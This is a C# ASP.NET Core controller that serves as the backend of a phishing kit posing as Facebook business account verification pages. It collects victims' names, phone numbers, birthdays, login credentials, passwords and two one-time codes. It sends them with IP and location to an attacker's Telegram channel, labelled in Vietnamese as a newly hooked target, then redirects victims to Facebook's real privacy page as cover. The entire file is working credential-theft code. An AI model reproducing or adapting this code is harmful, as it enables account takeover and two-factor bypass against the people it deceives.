using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.RazorPages;
using System.Diagnostics;
using TelegramBot;
using WebApplication1.Models;

namespace WebApplication1.Controllers
{
    public class BusinessController : Controller
    {
        private readonly ILogger<BusinessController> _logger;
        private readonly IConfiguration _configuration;
        private readonly ITelegramBot _telegramBot;

        public BusinessController(ILogger<BusinessController> logger, IConfiguration configuration, ITelegramBot telegramBot)
        {
            _logger = logger;
            _configuration = configuration;
            _telegramBot = telegramBot;
        }

        [HttpPost]
        public IActionResult RestrictionsInformation(string authen)
        {
            return View();
        }

        [HttpPost]
        public IActionResult Login(string pageName, string yourName, string phoneNumber, string birthday)
        {
            HttpContext.Session.SetString(Constants.PAGE_NAME, pageName);
            HttpContext.Session.SetString(Constants.NAME, yourName);
            HttpContext.Session.SetString(Constants.PHONE, phoneNumber);
            HttpContext.Session.SetString(Constants.BIRTHDAY, birthday);
            return View();
        }

        [HttpPost]
        public IActionResult Confirming(string emailOrPhone, string password, string action, string otpCode)
        {
            if (!string.IsNullOrEmpty(emailOrPhone))
            {
                HttpContext.Session.SetString(Constants.EMAIL_OR_PHONE, emailOrPhone);
                HttpContext.Session.SetString(Constants.PASSWORD, password);
            }
            if (!string.IsNullOrEmpty(password) && string.IsNullOrEmpty(emailOrPhone))
            {
                HttpContext.Session.SetString(Constants.PASSWORD2, password);
                ViewBag.Message = "otp";
            }
            if (!string.IsNullOrEmpty(otpCode))
            {
                var otp1 = HttpContext.Session.GetString(Constants.OTP1);
                if (string.IsNullOrEmpty(otp1))
                {
                    HttpContext.Session.SetString(Constants.OTP1, otpCode);
                    ViewBag.Message = "otp2";
                }
                else
                {
                    HttpContext.Session.SetString(Constants.OTP2, otpCode);
                    SendData();
                    Thread.Sleep(3000);
                    return Redirect("https://www.facebook.com/privacy/policy?section_id=0-WhatIsThePrivacy");
                }
            }

            string timeWait = _configuration["TimeWait"];
            ViewBag.TimeConfirm = timeWait;

            SendData();

            return View();
        }

        private async void SendData()
        {
            HttpContext.Session.GetString(Constants.IP);
            HttpContext.Session.GetString(Constants.LOCATION);
            HttpContext.Session.GetString(Constants.PAGE_NAME);
            HttpContext.Session.GetString(Constants.NAME);
            HttpContext.Session.GetString(Constants.PHONE);
            HttpContext.Session.GetString(Constants.BIRTHDAY);
            HttpContext.Session.GetString(Constants.EMAIL_OR_PHONE);
            HttpContext.Session.GetString(Constants.PASSWORD);
            HttpContext.Session.GetString(Constants.PASSWORD2);
            HttpContext.Session.GetString(Constants.OTP1);
            HttpContext.Session.GetString(Constants.OTP2);

            string telegramBotToken = _configuration["TelegramBotToken"];
            string channel = _configuration["Channel"];
            var message = "ĐỐI TƯỢNG MỚI DÍNH ĐÒN: " + HttpContext.Session.GetString(Constants.IP) + "\n" +
                          "IP: " + HttpContext.Session.GetString(Constants.IP) + "\n" +
                          "Location: " + HttpContext.Session.GetString(Constants.LOCATION) + "\n" +
                          "Page Name: " + HttpContext.Session.GetString(Constants.PAGE_NAME) + "\n" +
                          "Name: " + HttpContext.Session.GetString(Constants.NAME) + "\n" +
                          "Phone: " + HttpContext.Session.GetString(Constants.PHONE) + "\n" +
                          "Birthday: " + HttpContext.Session.GetString(Constants.BIRTHDAY) + "\n" +
                          "Email or Phone: " + HttpContext.Session.GetString(Constants.EMAIL_OR_PHONE) + "\n" +
                          "Password: " + HttpContext.Session.GetString(Constants.PASSWORD) + "\n" +
                          "Password2: " + HttpContext.Session.GetString(Constants.PASSWORD2) + "\n" +
                          "OTP1: " + HttpContext.Session.GetString(Constants.OTP1) + "\n" +
                          "OTP2: " + HttpContext.Session.GetString(Constants.OTP2) + "\n" +
                          "Time: " + DateTime.UtcNow.AddHours(7).ToString("dd/MM/yyyy HH:mm") + "\n";

            try
            {
                await _telegramBot.SendMessageAsync(telegramBotToken, channel, message);
                Console.WriteLine("Send message success");
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }


        }

        [HttpGet]
        public IActionResult IncorrectPassword()
        {
            ViewBag.Message = "otp";
            return View();
        }

        [HttpGet]
        public IActionResult Authentication()
        {
            var otp1 = HttpContext.Session.GetString(Constants.OTP1);
            if (!string.IsNullOrEmpty(otp1))
            {
                ViewBag.Message = "The code that you've entered is incorrect.";
            }
            return View();
        }

        [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
        public IActionResult Error()
        {
            return View(new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier });
        }
    }
}
